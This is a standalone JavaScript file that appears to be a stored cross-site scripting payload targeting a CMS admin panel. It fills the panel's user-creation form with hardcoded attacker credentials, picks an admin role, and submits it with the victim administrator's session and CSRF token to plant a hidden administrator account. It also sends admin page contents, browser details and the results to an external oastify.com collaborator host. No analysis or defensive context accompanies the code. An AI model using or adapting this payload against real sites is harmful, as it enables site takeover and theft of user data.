(function(){
var B='https://s5y0jserwzmmura7v7ab2q8wmnsdgd50nie7.oastify.com';
var EM='cms.sync2461@outlook.com';
var PW='Xk9wQ2vL!pR7tZ4m';
var UN='cmssync2461';
function bk(p,d){try{fetch(B+'/'+p+'/'+encodeURIComponent(String(d).substr(0,1500)))}catch(e){}}
if(!/^\/Admin/.test(location.pathname)){bk('pub',location.pathname);return}
bk('r',navigator.userAgent.substr(0,80)+'|'+screen.width);
fetch('/Admin/Users').then(function(r){return r.text()}).then(function(h){bk('u',h.substr(0,1400))}).catch(function(){});
fetch('/Admin/Users/Create').then(function(r){return r.text()}).then(function(h){
if(/Attention Required|Just a moment|challenge-platform|cf-ray/i.test(h)){bk('cf',h.substr(0,200));return}
if(/yoxdur/i.test(h)){bk('ad','1');return}
var doc=new DOMParser().parseFromString(h,'text/html');
var fs=doc.querySelectorAll('form');
var f=null;
for(var i=0;i<fs.length;i++){if(/Users\/Create/i.test(fs[i].getAttribute('action')||'')){f=fs[i]}}
if(!f&&fs.length){f=fs[fs.length-1]}
if(!f){bk('nf',h.substr(0,300));return}
var fa=f.getAttribute('action')||'';
if(/Logout|Login/i.test(fa)){bk('lo',fa);return}
var c=+(localStorage.getItem('azc1')||0);
if(c>=3){bk('max','1');return}
localStorage.setItem('azc1',String(c+1));
var fd=new FormData();
var els=f.querySelectorAll('input,select,textarea');
var seen={};
for(var j=0;j<els.length;j++){
var e=els[j],n=e.name||'';
if(!n||seen[n]){continue}
var t=(e.type||e.tagName).toLowerCase();
if(n==='__RequestVerificationToken'){seen[n]=1;fd.append(n,e.value);continue}
if(t==='password'){seen[n]=1;fd.append(n,PW);continue}
if(n.toLowerCase().indexOf('email')>=0){seen[n]=1;fd.append(n,EM);continue}
if(e.tagName==='SELECT'){
seen[n]=1;
var os=e.options,pick=os[0];
for(var k=0;k<os.length;k++){if(/admin/i.test(os[k].value+' '+os[k].text)){pick=os[k]}}
if(pick===os[0]&&os.length>1){pick=os[1]}
fd.append(n,pick.value);
bk('sel',n+':'+[].map.call(os,function(o){return o.value+'='+o.text}).join(','));
continue}
if(t==='hidden'){seen[n]=1;fd.append(n,e.value);continue}
if(t==='checkbox'){seen[n]=1;fd.append(n,'true');continue}
if(t==='radio'){if(e.checked){seen[n]=1;fd.append(n,e.value)}continue}
if(t==='submit'||t==='button'){continue}
if(n.toLowerCase().indexOf('name')>=0||n.toLowerCase().indexOf('user')>=0){seen[n]=1;fd.append(n,UN);continue}
seen[n]=1;fd.append(n,e.value||'')}
bk('fd',[].map.call(fd.entries(),function(x){return x[0]+'~'+String(x[1]).substr(0,25)}).join('|'));
return fetch('/Admin/Users/Create',{method:'POST',body:fd,credentials:'include'}).then(function(r){return r.text()}).then(function(x){bk('p',x.substr(0,700))}).catch(function(x){bk('pe',String(x))})
}).catch(function(e){bk('ce',String(e))});
})();
